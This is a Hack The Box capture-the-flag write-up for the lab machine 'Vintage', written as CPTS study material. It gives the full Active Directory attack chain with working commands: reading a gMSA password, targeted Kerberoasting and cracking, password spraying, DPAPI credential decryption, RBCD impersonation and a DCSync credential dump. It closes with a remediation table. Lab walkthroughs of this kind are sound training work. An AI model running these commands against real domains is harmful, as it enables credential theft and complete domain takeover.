# Vintage — Assume-breach AD chain from a legacy machine password to RBCD on the DC

[![Difficulty](https://img.shields.io/badge/difficulty-Hard-orange)](https://app.hackthebox.com/machines/vintage)
[![OS](https://img.shields.io/badge/OS-Windows-blue)](https://app.hackthebox.com/machines/vintage)
[![](https://img.shields.io/badge/walkthrough-IppSec-ff0000?logo=youtube&logoColor=white)](https://www.youtube.com/watch?v=-JM--KfVhpA)

> **Attack path:** Given creds `P.Rosa` → BloodHound shows `FS01$` in Pre-Windows 2000 Compatible Access (machine password = `fs01`) → read `gMSA01$` password → join ServiceManagers, enable + targeted-Kerberoast `svc_sql` → crack → password spray finds reuse on `C.Neri` → WinRM → DPAPI-decrypt Windows Credential Manager entry for `C.Neri_adm` → GenericWrite on DelegatedAdmins → add `FS01$` → RBCD (S4U) as `DC01$` → DCSync → Domain Admin shell.

Retired box IP: `10.10.11.45` (pure AD scenario — HTB gives you credentials to start, as in a real-world internal pentest).

## 1 · Reconnaissance

### Port scan

A single Domain Controller, nothing else:

```bash
nmap -p- --min-rate 10000 10.10.11.45
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV 10.10.11.45
```

Domain `vintage.htb`, hostname `DC01` (LDAP/SSL certs). Hosts file — order and FQDNs matter, because Kerberos is picky:

```
10.10.11.45 DC01 DC01.vintage.htb vintage.htb FS01.vintage.htb
```

### Starting credentials

The box scenario hands you a low-priv user:

```
P.Rosa / Rosaisbest123
```

### Kerberos-only authentication

NTLM is disabled here. Plain password auth fails with `STATUS_NOT_SUPPORTED`; adding `-k` (Kerberos) works, but only against the FQDN:

```bash
netexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123        # NTLM:False -> fails
netexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -k     # [+] works
```

Priorities from here: SMB shares (default DC shares only, nothing juicy), BloodHound, and user enumeration.

## 2 · Foothold

### BloodHound collection

The Python collector works over Kerberos from Linux:

```bash
bloodhound-ce-python -c all -d vintage.htb -u P.Rosa -p Rosaisbest123 -ns 10.10.11.45 --zip
```

Two computers show up: `dc01.vintage.htb` and `fs01.vintage.htb`. Note the second one — in BloodHound, `FS01$` is a member of **Pre-Windows 2000 Compatible Access**.

### Legacy machine password

A computer account in that legacy group typically still uses its default machine password: the **lowercase hostname without the trailing `$`**. Test it:

```bash
netexec ldap dc01.vintage.htb -u 'FS01$' -p fs01 -k     # [+] vintage.htb\FS01$:fs01
```

### Read the gMSA password

BloodHound also shows `FS01$` has `ReadGMSAPassword` on `gMSA01$`. LDAPS is not configured on this box, so `netexec --gmsa` dies trying LDAPS — use BloodyAD over Kerberos instead:

```bash
bloodyAD -d vintage.htb --host dc01.vintage.htb -u 'fs01$' -p fs01 -k \
  get object 'gmsa01$' --attr msDS-ManagedPassword
# msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178
```

(`ldapsearch -Y GSSAPI` on `msDS-ManagedPassword` plus a decode script works too.)

Validate and grab a TGT for the next stage:

```bash
netexec smb dc01.vintage.htb -u 'gmsa01$' -H b3a15bbdfb1c53238d4b50ea2c4d1178 -k
getTGT.py -k -hashes :b3a15bbdfb1c53238d4b50ea2c4d1178 'vintage.htb/gmsa01$'
```

## 3 · User flag

### GMSA01$ → ServiceManagers → service accounts

In BloodHound, `gMSA01$` has **GenericWrite + AddSelf** on the **ServiceManagers** group, and that group has **GenericAll** over three service accounts: `svc_sql` (disabled), `svc_ldap`, `svc_ark`. Plan: join the group, enable `svc_sql`, targeted-Kerberoast all three, crack.

Add self to the group (`-f rc4` because we only have the NTLM, and `-p` takes just the NTLM here):

```bash
bloodyAD -d vintage.htb -k --host dc01.vintage.htb -u 'GMSA01$' \
  -p b3a15bbdfb1c53238d4b50ea2c4d1178 -f rc4 add groupMember ServiceManagers 'GMSA01$'
```

Enable the disabled account — note you need a **fresh TGT** so the new group membership is in your ticket:

```bash
getTGT.py -k -hashes :b3a15bbdfb1c53238d4b50ea2c4d1178 vintage.htb/gmsa01$
KRB5CCNAME=gmsa01\$.ccache bloodyAD -d vintage.htb -k --host dc01.vintage.htb \
  remove uac svc_sql -f ACCOUNTDISABLE
```

### Targeted Kerberoast and crack

One command grabs hashes for accounts you control (the `--dc-host` flag is required here or the script falls back to broken anonymous LDAP resolution):

```bash
KRB5CCNAME=gmsa01\$.ccache targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb
```

Crack mode 13100:

```bash
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -m 13100
# svc_sql: Zer0the0ne
```

(The manual equivalent: `bloodyAD set object svc_ldap servicePrincipalName -v 'http/whatever'` then `netexec ldap ... --kerberoasting`.)

### Password spray

Build a user list (`netexec smb ... --users`, or jq the BloodHound users json) and spray — the service password is reused by a human:

```bash
netexec smb dc01.vintage.htb -u users.txt -p Zer0the0ne -k --continue-on-success
# [+] vintage.htb\C.Neri:Zer0the0ne
```

`C.Neri` is in Remote Management Users. Get an interactive Kerberos session and WinRM:

```bash
kinit c.neri
evil-winrm -i dc01.vintage.htb -r vintage.htb
```

```powershell
*Evil-WinRM* PS C:\Users\C.Neri\desktop> cat user.txt
<flag>
```

## 4 · Privilege escalation

### Windows Credential Manager + DPAPI

`C.Neri` has a saved credential blob:

```powershell
ls -force C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials
# C4BB96844A5C9DD45D5B6A9859252BA6
ls -force C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-...-1115
# two DPAPI masterkey GUIDs + BK-VINTAGE + Preferred
```

`cmdkey /l` shows nothing in a WinRM (non-interactive) session, and Defender kills RunasCs — so exfil the blobs (base64 them out) and decrypt offline:

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6'))
```

```bash
dpapi.py masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-...-1115 -password Zer0the0ne
dpapi.py credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0x<decrypted-masterkey>
# Username: vintage\c.neri_adm   Password: Uncr4ck4bl3P4ssW0rd0312
```

(Try each masterkey GUID — one decrypts the blob, the other gives a padding error.)

### From C.Neri_adm to RBCD on DC01

Back in BloodHound, mark `C.Neri_adm` owned and run "Shortest paths from Owned objects": `C.Neri_adm` has **GenericWrite** on the **DelegatedAdmins** group, and DelegatedAdmins has **AllowedToAct** (resource-based constrained delegation) on `DC01`.

RBCD needs an object with an SPN to impersonate through — `FS01$` qualifies (computer accounts have SPNs). Add it to the group:

```bash
kinit c.neri_adm
KRB5CCNAME=/tmp/krb5cc_1000 bloodyAD -d vintage.htb -k --host dc01.vintage.htb \
  add groupMember DelegatedAdmins 'fs01$'
```

## 5 · Root flag / Domain Admin

### S4U2self + S4U2Proxy as DC01$

With `FS01$` now allowed to act on the DC, request a service ticket impersonating the DC's own computer account:

```bash
kinit fs01$   # password: fs01
getST.py -spn 'cifs/dc01.vintage.htb' -impersonate 'dc01$' \
  'vintage.htb/fs01$:fs01' -dc-ip dc01.vintage.htb
```

### DCSync

The resulting ccache authenticates as `dc01$` (a DC can DCSync):

```bash
KRB5CCNAME=dc01\$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache \
  netexec smb dc01.vintage.htb -k --use-kcache --ntds
# or full dump:
KRB5CCNAME=dc01\$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache \
  secretsdump.py 'vintage.htb/dc01$@dc01.vintage.htb' -k -no-pass
```

### Final shell

The `Administrator` hash is valid but the account is blocked from remote logon (`STATUS_LOGON_TYPE_NOT_GRANTED`). Domain Admins has a second member — `L.Bianchi_adm` — which works:

```bash
getTGT.py vintage.htb/L.Bianchi_adm@dc01.vintage.htb -hashes :<nthash>
KRB5CCNAME=L.Bianchi_adm@dc01.vintage.htb.ccache evil-winrm -i dc01.vintage.htb -r vintage.htb
```

```powershell
*Evil-WinRM* PS C:\Users\administrator\desktop> type root.txt
<flag>
```

## 6 · Impact & remediation

| Risk | Impact | Remediation |
|---|---|---|
| Computer account (`FS01$`) in Pre-Windows 2000 Compatible Access with default machine password | Anyone who can guess `fs01` becomes that computer and reads gMSA secrets | Remove legacy compatibility membership; force machine password rotation; audit for default/downlevel passwords |
| `ReadGMSAPassword` granted to broad groups (Domain Computers) | Compromise of any member host yields the service account's NTLM | Scope `PrincipalsAllowedToRetrievePassword` to exact principals |
| ServiceManagers group has GenericAll over service accounts | Members enable disabled accounts and set SPNs — targeted Kerberoast → cracked plaintext | Split manage/permissions duties; alert on `userAccountControl` and `servicePrincipalName` changes; use gMSA/long passwords for services |
| Password reuse between `svc_sql` and `C.Neri` | Service compromise pivots into a interactive user (password spray) | Ban shared credentials; distinct service and human passwords |
| Saved enterprise credential in Credential Manager | DPAPI blob + user password offline-decrypts to a privileged `_adm` account | Remove stored credentials; require LAPS-style isolation; protect tier-1 accounts from tier-0 logins |
| DelegatedAdmins granted RBCD (AllowedToAct) on the DC | Any controllable SPN-holding object can S4U to DC01 → DCSync → full domain compromise | Restrict `msDS-AllowedToActOnBehalfOfOtherIdentity`; treat delegation rights on the DC as Tier-0 |

## 7 · CPTS takeaways

- **Assume-breach flow**: CPTS AD sets start with creds. Verify them over every protocol, notice when NTLM is disabled, and switch every tool to Kerberos (`-k`, `KRB5CCNAME`, proper FQDN `/etc/hosts`).
- Learn the **Pre-Windows 2000 Compatible Access** tell: computer in the group → machine password is the lowercase hostname. Feeds directly into gMSA password reads.
- **gMSA abuse**: know at least one reliable read primitive (`bloodyAD get object --attr msDS-ManagedPassword`) and remember group changes require a **fresh TGT** to take effect.
- **Targeted Kerberoast** (write an SPN you're GenericAll over, roast, crack) and **password spraying** cracked service passwords against users are exam-staple pivots.
- Master the full **DPAPI offline chain** (credential blob + Protect masterkeys + `dpapi.py`) and **RBCD end-to-end** (GenericWrite on a group with AllowedToAct → `bloodyAD add groupMember` → `getST.py -impersonate` → DCSync). Both appear constantly in CPTS-level labs.
